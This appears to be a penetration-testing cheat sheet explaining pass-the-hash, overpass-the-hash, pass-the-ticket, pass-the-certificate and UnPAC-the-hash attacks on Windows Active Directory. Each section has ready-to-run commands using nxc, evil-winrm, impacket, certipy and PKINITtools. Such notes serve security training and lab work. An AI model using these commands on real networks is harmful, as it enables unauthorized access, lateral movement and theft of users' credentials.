# Pass-the-\*

## Pass the hash

>In computer security, **pass the hash** is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LanMan hash of a user's password, instead of requiring the associated plaintext password as is normally the case. It replaces the need for stealing the plaintext password to gain access with stealing the hash.

### Examples

```bash
# smb
nxc smb 10.10.10.10 -u admin -H 3b3ecc95801ddd132380e20a9ab5126c

# winrm
evil-winrm -i 10.10.10.10 -u admin -H 3b3ecc95801ddd132380e20a9ab5126c

# rdp
xfreerdp /v:10.10.10.10 /u:admin /pth:'3b3ecc95801ddd132380e20a9ab5126c'
```

## Overpass-the-Hash | Pass-the-key

>**Over Pass the Hash** is a Kerberos-based attack that requires an attacker to use the obtained hashes to request a full Kerberos **TGT** ticket from the **KDC (***Kerberos Domain Controller)*on behalf of the compromised user. This technique is often used in tandem with ***Pass the Ticket,\*** in which the forged tickets are passed and reinjected many times until they expire to bypass communications with the KDC.
>
>**OPTH** can be an impactful attack if attackers have compromised hashes with a single-sign-on option. They would be able to leverage the TGT requests to get service tickets to many resources within the network.

### Example

- To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.

```bash
python getTGT.py domain.local/tom -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/tom.ccache
python psexec.py domain.local/tom@lab01.domain.local -k -no-pass
```

## Pass the ticket

>Pass the Ticket is a sophisticated cyberattack that targets the **Kerberos** authentication protocol. In this type of attack, an adversary steals a Kerberos Ticket Granting Ticket (TGT) from a compromised machine. This stolen ticket is then used to impersonate the legitimate user, allowing the attacker to gain unauthorized access to network resources without needing the user's password.

### Example

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
python psexec.py domain.local/tom@lab01.domain.local -k -no-pass
```

## Pass-The-Certificate

>The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.
>
>Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along shadow credentials, AD CS escalation and UnPAC-the-hash attacks.
>
>**Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key**. A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for authentication.
>
>The "certificate + private key" pair is usually used in the following manner
>
>- PEM certificate + PEM private key
>- PFX certificate export (which contains the private key) + PFX password (which protects the PFX certificate export)

### Example

```bash
# request a TGT with the certificate of user
certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
```

## UnPac the Hash

>When using PKINIT to obtain a TGT (Ticket Granting Ticket), the KDC (Key Distribution Center) includes in the ticket a `PAC_CREDENTIAL_INFO` structure containing the NTLM keys (i.e. LM and NT hashes) of the authenticating user. This feature allows users to switch to NTLM authentications when remote servers don't support Kerberos, while still relying on an asymmetric Kerberos pre-authentication verification mechanism (i.e. PKINIT).
>
>The NTLM keys will then be recoverable after a TGS-REQ through U2U, combined with S4U2self, which is a Service Ticket request made to the KDC where the user asks to authenticate to itself (i.e. S4U2self + User-to-User authentication).
>
>The following protocol diagram details how UnPAC-the-hash works. It allows attackers that know a user's private key, or attackers able to conduct Shadow Credentials or Golden certificate attacks, to recover the user's LM and NT hashes.

### Examples

From UNIX-like systems, this attack can be conducted with PKINITtools (Python).

The first step consists in **obtaining a TGT** by validating a PKINIT pre-authentication first.

```bash
gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```

Once the TGT is obtained, and the session key extracted (printed by gettgtpkinit.py), the getnthash.py script can be used to recover the NT hash.

```bash
export KRB5CCNAME="TGT_CCACHE_FILE"
getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
```

The NT hash can be used for pass-the-hash, silver ticket, or Kerberos delegations abuse.
